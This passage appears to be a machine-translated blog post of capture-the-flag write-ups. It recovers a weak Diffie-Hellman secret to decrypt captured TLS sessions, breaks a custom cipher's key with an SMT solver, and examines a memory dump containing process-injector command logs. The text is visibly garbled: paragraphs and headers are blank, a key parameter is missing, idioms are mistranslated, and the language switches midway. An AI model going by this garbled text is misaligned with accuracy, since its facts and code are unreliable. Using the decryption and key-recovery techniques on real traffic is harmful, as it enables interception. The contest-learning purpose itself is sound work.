= 178.128.199.130 opin1337).  Quando conectado à porta 31337, descobriu-se que o servidor suporta 3 comandos, alguns dos quais solicitam argumentos adicionais </p><br><pre> <code class="plaintext hljs">nc 178.128.199.130 31337 Yet another fucking heap task... Command: 1-3 1 - Index: - Size: 2 - Index: 3 - Index: - Length:</code> </pre> <br><p>  Mas nada poderia ser feito mais com essa porta, e provavelmente era uma tarefa que distraía. </p><br></li><li><p>  Depois de olhar atentamente para o cliente, vi que ele usa um gerador de segredos Diffie-Hellman personalizado: </p><br><pre> <code class="plaintext hljs">int __fastcall rnd_work(__int64 a1) { __int64 v1; // rsi unsigned int i; // [rsp+10h] [rbp-10h] rnd_read(); BN_bin2bn(&amp;RANDOM_512, 512LL, a1); BN_lshift1(a1, a1); v1 = (unsigned int)BITS_ind[0]; // BITS_ind dd 4096, 4095, 4081, 4069, 0 if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[0]) ) { for ( i = 0; i &lt;= 4; ++i ) { if ( (unsigned int)BN_is_bit_set(a1, (unsigned int)BITS_ind[i]) ) { v1 = (unsigned int)BITS_ind[i]; BN_clear_bit(a1, v1); } else { v1 = (unsigned int)BITS_ind[i]; BN_set_bit(a1, v1); } } } if ( (unsigned int)((signed int)((unsigned __int64)BN_num_bits(a1) + 7) / 8) &gt; 0x200 ) { printf("Err!", v1); exit(0); } BN_bn2binpad(a1, &amp;RANDOM_512, 512LL); return rnd_write(); }</code> </pre> <br><p>  Inicialmente, o segredo (512 bytes) é lido em / dev / urandom e salvo no arquivo de estado.  A cada solicitação subsequente, a seguinte mágica acontece com um segredo: </p><br><pre> <code class="plaintext hljs">XOR = 2**4096 + 2**4095 + 2**4081 + 2**4069 + 1 CMP = 2**4096 state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  O segredo como um número longo é deslocado 1 bit para a esquerda e, se o bit mais significativo for 1, o número está na constante de 5 bits diferentes de zero (XOR). </p><br></li></ol><br><p>  Olhando pcap, vi que os parâmetros Diffie-Hellman que chegam do servidor são constantes: </p><br><pre> <code class="plaintext hljs">dh_g = 2 dh_p =</code> </pre> <br><p>  E cada vez que uma conexão é estabelecida, o cliente envia sua parte pública do segredo de Diffie-Hellman.  Ao comparar as partes públicas dos segredos das sessões vizinhas, você pode restaurar o segredo inicial do cliente e todos os segredos subsequentes de cada sessão: <br>  Se o bit mais alto do segredo for 0, na próxima sessão o segredo será simplesmente duas vezes maior e a parte pública será ao quadrado módulo p.  Assim, foi possível restaurar o segredo inicial (o que foi lido em / dev / urandom) modulo p: </p><br><pre><code class="plaintext hljs">212030266574081313400816495535550771039880390539286135828101869037345869420205997453325815053364595553160004790759435995827592517178474188665111332189420650868610567156950459495593726196692754969821860322110444674367830706684288723400924718718744572072716445007789955072532338996543460287499773137785071615174311774659549109541904654568673143709587184128220277471318155757799759470829597214195494764332668485009525031739326801550115807698375007112649770412032760122054527000645191827995252649714951346955180619834783531787411998600610075175494746953236628125613177997145650859163985984159468674854699901927080143977813208682753148280937687469933353788992176066206254339449062166596095349440088429291135673308334245804375230115095159172312975679432750163246936266603077314220813042048063033927345613565227184333091534551071824033535159483541175958867122974738255966511008607723675431569961127852005437047813822454112416864211120323016008267853722731311026233323235121922969702016337164336853826598082855592007126727352041124911221048498141841625765390204460725231581416991152769176243658310857769293168120450725070030636638954553866903537931113666283836250525318798622872347839391197939468295124060629961250708172499966110406527347</code></pre><br><p>  e é fácil calcular os segredos de todas as outras sessões. </p><br><p>  E aqui houve problemas: <br>  A) O Wireshark não é capaz de descriptografar o SSL, conhecendo os segredos da Diffie-Hellman, e não havia soluções prontas.  Precisamos descobrir o segredo geral de Diffie-Hellman (também conhecido como sessões de pré-master key) e usá-lo para encontrar uma sessão de master master usando uma bicicleta grande (não achei que houvesse bicicletas no SSL).  Em seguida, você pode criar um arquivo SSLKEYLOG no qual gravar o cliente aleatoriamente (em cada sessão SSL) e a chave mestra, especificá-lo nas configurações do WireShark para descriptografia do SSL e, teoricamente, obter lucro. </p><br><p>  Mas surgiram mais alguns problemas: <br>  B) PHP considerado muito lento (funções <code>bcpowmod</code> , <code>bcpowmod</code> não são usadas ...), decidi reescrevê-lo em python. <br>  C) A fórmula para calcular a chave mestra pela chave pré-mestra em forma humana não pôde ser encontrada, ssl é muito difícil de entender, eu não consegui o openssl para exibir os resultados dos cálculos intermediários.  Como resultado, usei <a href="">esse código</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">descrição</a> e algum tipo de RFC: <br><img src="https://habrastorage.org/webt/hl/ko/q6/hlkoq67uttadwf0spe68fvvgtgo.png"></p><br><p>  Como resultado, depois de meio dia, pude sobrepor isso (para mim, isso não poderia acontecer sem bicicletas): </p><br><pre> <code class="plaintext hljs">for i in xrange(0, 4264): dh_secret = pow(srv_pubkeys[i], state, dh_p) dh_secret = hex(dh_secret)[2:-1] if len(dh_secret) % 2 : dh_secret = "0"+dh_secret while dh_secret[0:2] == "00": dh_secret = dh_secret[2:] dh_secret = dh_secret.decode("hex") seed = "master secret"+(cl_random[i].strip() + srv_random[i].strip()).decode("hex") A = seed master_key = "" for j in xrange(0, 2): A = hmac.new(dh_secret, A, hashlib.sha256).digest() master_key += hmac.new(dh_secret, A+seed, hashlib.sha256).digest() master_key = master_key[0:48].encode("hex") print "CLIENT_RANDOM " + cl_random[i].strip() + " " + master_key state *= 2 if state &gt; CMP: state ^= XOR</code> </pre> <br><p>  D) Para extrair vários clientes aleatórios, ... das sessões do Wireshark, a exportação para csv foi usada e pesquisou no tráfego bruto o que entrou no csv como "...". </p><br><p>  E) Para descriptografar 4264 sessões, o WireShark decidiu consumir muitos gigabytes de operativo (8 não era suficiente para ele), mas nada, você pode executar tudo em um computador poderoso, e não em um laptop fraco.  No entanto, ao exportar objetos http (partes descriptografadas de uma imagem), o WireShark pode salvar apenas os primeiros 1000 arquivos e a numeração termina.  Como resultado, tive que dividir o pcap em 5 partes de 1000 sessões tcp em cada uma.  O resultado foi uma imagem tão bonita depois de colar todas as peças: </p><br><p><img src="https://habrastorage.org/webt/kn/op/xh/knopxh0nebqck4xuix2kvgmoyju.png"></p></div></div><br><p>  Todos os arquivos usados ​​pelo vencedor para resolver a tarefa podem ser encontrados <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">aqui</a> . </p><br><h2>  Dia 5. CASCA PROTEGIDA </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Vencedores </td></tr><tr><td align="center">  <b>1º lugar</b> </td><td align="center">  <b>2º lugar</b> </td><td align="center">  <b>3º lugar</b> </td></tr><tr><td align="center">  vos </td><td align="center">  Bartimeu </td><td align="center">  Clo </td></tr><tr><td colspan="3" align="center">  Também decidido: Maxim Pronin, 0x3c3e, tinkerlock, demidov_al, x @ secator, groke_in_the_sky, d3fl4t3 </td></tr></tbody></table></div><br><p>  Tarefa preparada pelo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">RuCTFE</a> .  Os participantes receberam um arquivo executável ofuscado com várias técnicas anti-depuração.  O arquivo executável é como um cliente SSH conectado a um servidor conhecido anteriormente.  A tarefa é entender o algoritmo desse arquivo para obter a execução de comandos no servidor.  A solução do autor envolvia contornar a anti-depuração e analisar a ofuscação. </p><br><p>  Vale ressaltar que o participante mais rápido resolveu a tarefa de uma maneira original diferente da planejada pelo autor e, depois disso, encontrou outra solução alternativa.  Você pode ver como ele fez isso no spoiler abaixo. </p><br><div class="spoiler">  <b class="spoiler_title">Opções de solução de tarefas do quinto dia (vos)</b> <div class="spoiler_text"><iframe width="560" height="315" src="https://www.youtube.com/embed/rpq5R9wnoiM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/00xBulNZkGI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></div></div><br><h2>  Dia 6. DESBLOQUEAR </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center">  Vencedores </td></tr><tr><td align="center">  <b>1º lugar</b> </td><td align="center">  <b>2º lugar</b> </td><td align="center">  <b>3º lugar</b> </td></tr><tr><td align="center">  gotdaswag </td><td align="center">  medidrdrider </td><td align="center">  sysenter </td></tr></tbody></table></div><br><p>  A tarefa do sexto dia foi preparada pela equipe do <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">VolgaCTF</a> .  Dado um arquivo executável que implementa um algoritmo criptográfico personalizado.  A tarefa é descriptografar o arquivo fornecido na condição, criptografado usando esse algoritmo, sem ter uma chave conhecida. </p><br><div class="spoiler">  <b class="spoiler_title">Solução de tarefa do sexto dia (gotdaswag)</b> <div class="spoiler_text"><h3 id="intro">  INTRODUÇÃO </h3><br><p>  Dado um arquivo com dois arquivos, <strong>locker</strong> e <strong>secret.png.enc</strong> . </p><br><p>  O primeiro arquivo é um <strong>ELF</strong> para Linux x86-64, que recebe um arquivo e uma chave de criptografia como entrada, e o segundo é uma imagem <strong>PNG</strong> criptografada. </p><br><pre> <code class="plaintext hljs"># ./locker Required option 'input' missing Usage: ./locker [options] Options: -i, --input in.png Input file path -o, --output out.png.enc Output file path -k, --key 0004081516234200 Encryption key in hex -h, --help Print this help menu</code> </pre> <br><h3 id="locker">  LOCKER </h3><br><p>  Após analisar o arquivo no IDA, encontramos o algoritmo de criptografia na função <strong>project :: main</strong> . </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/0a3/e68/c77/0a3e68c773b0ff4a7c4d09a321deecd1.png"></p><br><p>  Tendo estudado, entendemos que se trata de uma <strong>cifra de bloco</strong> (ECB), com tamanho de bloco de <strong>32 bits</strong> , tamanho de chave de <strong>64 bits</strong> e número de rodadas de <strong>77</strong> . </p><br><h5 id="versiya-na-python">  Versão Python </h5><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(p, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): n = (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (p &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = p ^ k x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= p &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: p &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: p |= <span class="hljs-number"><span class="hljs-number">1</span></span> k = ror(k, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) p = ror(p, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p</code> </pre> <br><h3 id="secret-key">  CHAVE SECRETA </h3><br><p>  Sabemos que o arquivo criptografado é uma imagem <strong>PNG</strong> . <br>  Conseqüentemente, conhecemos <strong>alguns textos cifrados</strong> em forma de cabeçalho de arquivo (é padrão para PNG). <br><img src="https://habrastorage.org/getpro/habr/post_images/0b7/ecb/770/0b7ecb770732ca1fdc9f8cba8f0d8248.png"></p><br><p>  Vamos tentar da maneira simples e usar o <strong>solucionador SMT</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" title="Z3">Z3</a> ) para encontrar a chave de criptografia. <br>  Para fazer isso, modifique levemente o código e envie à entrada um par de texto simples-cifrado. </p><br><h5 id="task6_keypy">  task6_key.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> z3 <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> * <span class="hljs-comment"><span class="hljs-comment"># PNG file signature (8 bytes) + IHDR chunk header (8 bytes) PLAIN_TEXT = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52' BLOCK_SIZE = 4 def encrypt(p, k, rounds=77): for i in range(0, rounds): n = LShR(p, 4) &amp; 1 n |= LShR(p, 26) &amp; 0xE0 n |= LShR(p, 22) &amp; 0x10 n |= LShR(p, 13) &amp; 8 n |= LShR(p, 7) &amp; 4 n |= LShR(p, 4) &amp; 2 x = k ^ ZeroExt(32, p) x ^= LShR(ZeroExt(32, p), 12) x ^= LShR(ZeroExt(32, p), 20) x &amp;= 1 y = 1 &lt;&lt; ZeroExt(32, n) y &amp;= 0xBB880F0FC30F0000 y = LShR(y, ZeroExt(32, n)) y &amp;= 1 p = If(x == y, p &amp; 0xFFFFFFFE, p | 1) p = RotateRight(p, 1) k = RotateRight(k, 1) return p def qword_le_to_be(v): pv = struct.pack('&lt;Q', v) uv = struct.unpack('&gt;Q', pv) return uv[0] if len(sys.argv) &lt; 2: sys.exit('no input file specified') with open(sys.argv[1], 'rb') as encrypted_file: k = BitVec('k', 64) key = k solver = Solver() for i in range(0, len(PLAIN_TEXT), BLOCK_SIZE): # prepare plain text and cipher text pairs pt = struct.unpack('&lt;L', PLAIN_TEXT[i:i + BLOCK_SIZE])[0] ct = struct.unpack('&lt;L', encrypted_file.read(BLOCK_SIZE))[0] p = BitVecVal(pt, 32) e = BitVecVal(ct, 32) solver.add(encrypt(p, k) == e) print('solving ...') if solver.check() == sat: encryption_key = solver.model()[key].as_long() print('key: %016X' % qword_le_to_be(encryption_key))</span></span></code> </pre> <br><p>  Solução: </p><br><pre> <code class="plaintext hljs">&gt; python task6_key.py "secret.png.enc" solving ... key: AE34C511A8238BCC</code> </pre> <br><h3 id="unlocker"> UNLOCKER </h3><br><p>          . <br>                  . </p><br><h5 id="task6_unlockerpy"> task6_unlocker.py </h5><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> binascii BLOCK_SIZE = <span class="hljs-number"><span class="hljs-number">4</span></span> ror = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; r_bits%max_bits) | \ (val &lt;&lt; (max_bits-(r_bits%max_bits)) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) rol = <span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> val, r_bits, max_bits: \ (val &lt;&lt; r_bits%max_bits) &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>) | \ ((val &amp; (<span class="hljs-number"><span class="hljs-number">2</span></span>**max_bits<span class="hljs-number"><span class="hljs-number">-1</span></span>)) &gt;&gt; (max_bits-(r_bits%max_bits))) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">decrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(e, k, rounds=</span></span><span class="hljs-number"><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">77</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">:</span></span> dk = ror(k, <span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">0</span></span>, rounds): dk = rol(dk, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">64</span></span>) e = rol(e, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>) n = (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">1</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">26</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0xE0</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">22</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">0x10</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">13</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">8</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">4</span></span> n |= (e &gt;&gt; <span class="hljs-number"><span class="hljs-number">4</span></span>) &amp; <span class="hljs-number"><span class="hljs-number">2</span></span> x = e ^ dk x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">12</span></span> x ^= e &gt;&gt; <span class="hljs-number"><span class="hljs-number">20</span></span> x &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> y = <span class="hljs-number"><span class="hljs-number">1</span></span> &lt;&lt; n y &amp;= <span class="hljs-number"><span class="hljs-number">0xBB880F0FC30F0000</span></span> y &gt;&gt;= n y &amp;= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x == y: e &amp;= <span class="hljs-number"><span class="hljs-number">0xFFFFFFFE</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: e |= <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> e <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">2</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no input file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">3</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no output file specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">elif</span></span> len(sys.argv) &lt; <span class="hljs-number"><span class="hljs-number">4</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'no encryption key specified'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: key = binascii.unhexlify(sys.argv[<span class="hljs-number"><span class="hljs-number">3</span></span>]) key = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;Q'</span></span>, key)[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: sys.exit(<span class="hljs-string"><span class="hljs-string">'non-hexadecimal encryption key'</span></span>) print(<span class="hljs-string"><span class="hljs-string">'unlocking ...'</span></span>) start_time = time.time() <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>], <span class="hljs-string"><span class="hljs-string">'rb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> ef: <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(sys.argv[<span class="hljs-number"><span class="hljs-number">2</span></span>], <span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> df: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span>: ct = ef.read(BLOCK_SIZE) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> ct: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> ct = struct.unpack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, ct)[<span class="hljs-number"><span class="hljs-number">0</span></span>] pt = decrypt(ct, key) pt = struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;L'</span></span>, pt) df.write(pt) print(<span class="hljs-string"><span class="hljs-string">'done, took %.3f seconds.'</span></span> % (time.time() - start_time))</code> </pre> <br><p>  ,         . </p><br><pre> <code class="plaintext hljs">&gt; python task6_unlocker.py "secret.png.enc" "secret.png" "AE34C511A8238BCC" unlocking ... done, took 49.669 seconds.</code> </pre> <br><h5 id="secretpng"> secret.png </h5><br><p><img src="https://habrastorage.org/getpro/habr/post_images/9fa/18b/2b2/9fa18b2b2264379bd89ebcaaf62c3006.png"></p><br><blockquote> ZN{RA$T0GR@PHY_H3RTS} </blockquote></div></div><br><h2> Day 7. Beep Beep! </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center">  </td></tr><tr><td align="center"> <b>1 </b> </td></tr><tr><td align="center"> sysenter </td></tr></tbody></table></div><br><p>     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">SchoolCTF</a> .     ,    ,  .   ,       ,      . </p><br><div class="spoiler"> <b class="spoiler_title">    (sysenter)</b> <div class="spoiler_text"><p> Something that looks like VirtualBox RAM dump is provided to us. </p><br><p> We can try volatility, but it seems that it unable to locate required structures to restore Virtual Memory layout. </p><br><p><img src="https://habrastorage.org/webt/go/1l/7i/go1l7imiojbikday6awhxdrbw58.png"></p><br><p> No process memory for us today, so we will have to work with fragmented memory. </p><br><p> First of all let's precache strings from the dump. </p><br><pre> <code class="plaintext hljs">strings &gt; strings_ascii.txt strings -el &gt; strings_wide.txt</code> </pre> <br><p> Most interesting one is command execution log: </p><br><pre> <code class="plaintext hljs">cd .. .\injector.exe 192.168.1.65 .\run.exe .\storage cd .\server\ .\run.exe block1 .\run.exe block0 cd Z:\zn_2019\ cd .\server\ cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd .. touch echo echo qwe echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt .\injector.exe 192.168.1.65 echo qwe &gt; flag.txt cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ injector.exe 1921.68.1.65 injector.exe 192.68.1.65 ./injector.exe 192.68.1.65 .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\server\ run storage .\run.exe .\storage cd Z:\zn_2019\server\ .\run.exe block1 cd Z:\zn_2019\server\ .\run.exe block0 cd .. .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\injector.exe 192.168.1.65 .\injector2.exe 192.168.1.65 cd Z:\zn_2019\ .\Injector2.exe 192.168.1.65 '.\ConsoleApplication5 (2).exe' 192.168.1.65</code> </pre> <br><p> <strong>Not Important note:</strong> </p><br><p> <em>Not sure what <strong>SIGN.MEDIA</strong> is, but it looks like a cached file list from VirtualBox Network Share (Is this from Windows Registry?).</em> </p><br><pre> <code class="plaintext hljs">SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=138A400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=138A400 zn_2019\Injector2.exe SIGN.MEDIA=138A400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\NOTE1.exe SIGN.MEDIA=138A400 zn_2019\With_little_debug.exe SIGN.MEDIA=138A400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=138A400 zn_2019\injector.exe SIGN.MEDIA=138A400 zn_2019\nnnn.exe SIGN.MEDIA=138A400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=138A400 zn_2019\note.exe SIGN.MEDIA=138A400 zn_2019\note2.exe SIGN.MEDIA=138A400 zn_2019\note3.exe SIGN.MEDIA=138A400 zn_2019\note4.exe SIGN.MEDIA=138A400 zn_2019\random.exe SIGN.MEDIA=138A400 zn_2019\z.exe SIGN.MEDIA=17582C zn_2019\Injector2.exe SIGN.MEDIA=17582C zn_2019\injector.exe SIGN.MEDIA=196C2 zn_2019\server\run.exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C176B0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C176B0 zn_2019\Injector2.exe SIGN.MEDIA=1C176B0 zn_2019\injector.exe SIGN.MEDIA=1C176B0 zn_2019\note.exe SIGN.MEDIA=1C176B0 zn_2019\note2.exe SIGN.MEDIA=1C176B0 zn_2019\note3.exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1D02C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1D02C zn_2019\Injector2.exe SIGN.MEDIA=1C1D02C zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C1D02C zn_2019\With_little_debug.exe SIGN.MEDIA=1C1D02C zn_2019\injector.exe SIGN.MEDIA=1C1D02C zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C1D02C zn_2019\note.exe SIGN.MEDIA=1C1D02C zn_2019\note2.exe SIGN.MEDIA=1C1D02C zn_2019\note3.exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1DAB0 zn_2019\Injector2.exe SIGN.MEDIA=1C1DAB0 zn_2019\With_little_debug.exe SIGN.MEDIA=1C1DAB0 zn_2019\injector.exe SIGN.MEDIA=1C1DAB0 zn_2019\note.exe SIGN.MEDIA=1C1DAB0 zn_2019\note2.exe SIGN.MEDIA=1C1DAB0 zn_2019\note3.exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C30058 zn_2019\Injector2.exe SIGN.MEDIA=1C30058 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C30058 zn_2019\With_little_debug.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C30058 zn_2019\note.exe SIGN.MEDIA=1C30058 zn_2019\note2.exe SIGN.MEDIA=1C30058 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C89400 zn_2019\Injector2.exe SIGN.MEDIA=1C89400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C89400 zn_2019\NOTE1.exe SIGN.MEDIA=1C89400 zn_2019\With_little_debug.exe SIGN.MEDIA=1C89400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C89400 zn_2019\injector.exe SIGN.MEDIA=1C89400 zn_2019\nnnn.exe SIGN.MEDIA=1C89400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note2.exe SIGN.MEDIA=1C89400 